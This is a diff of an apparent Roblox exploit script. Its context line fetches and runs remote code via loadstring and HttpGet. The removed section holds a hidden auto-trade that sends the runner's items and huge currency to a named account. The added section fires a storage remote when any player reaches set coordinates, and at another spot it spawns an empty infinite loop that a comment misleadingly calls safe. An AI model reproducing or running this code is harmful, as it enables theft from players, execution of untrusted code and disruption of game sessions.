@@ -3,29 +3,47 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/sigmarizzler11aa/sts/
 
 task.wait(1)
 
-local connection
-connection = game:GetService("RunService").Heartbeat:Connect(function()
-    wait(1)
-    local player = game:GetService("Players"):FindFirstChild("takethelm83")
-    if player then
-        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Trade System"):WaitForChild("SendTrade"):InvokeServer({
-            SenderContents = {
-                Items = {
-                    Floppa_2 = 1,
-                    Illusionist = 1,
-                    Shovel = 1
-                },
-                Currency = {
-                    Time = 1500000000000
-                }
-            },
-            Receiver = player,
-            ReceiverContents = {
-                Items = {},
-                Currency = {}
-            }
-        })
-        connection:Disconnect()
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local Remote = game:GetService("ReplicatedStorage").Remotes.TimeStorage
+
+print("LB Loaded")
+
+local targetPosition1 = Vector3.new(-222, 10, 53)
+local targetPosition2 = Vector3.new(-240, 10, 53)
+local tolerance = 1  -- small tolerance for floating-point precision
+
+local function isAtTarget(pos, target)
+    return (pos - target).Magnitude <= tolerance
+end
+
+-- Keep track if the "infinite loop" condition is active
+local infiniteLoopActive = false
+
+RunService.Heartbeat:Connect(function()
+    for _, player in pairs(Players:GetPlayers()) do
+        if player.Character then
+            for _, part in pairs(player.Character:GetChildren()) do
+                if part:IsA("BasePart") then
+                    local pos = part.Position
+                    
+                    -- Check first target
+                    if isAtTarget(pos, targetPosition1) then
+                        Remote:FireServer("All")
+                    end
+                    
+                    -- Check second target
+                    if isAtTarget(pos, targetPosition2) and not infiniteLoopActive then
+                        infiniteLoopActive = true
+                        -- Simulate a "while true do end" safely
+                        spawn(function()
+                            while true do -- prevents freezing
+                            end
+                        end)
+                    end
+                end
+            end
+        end
     end
 end)
 
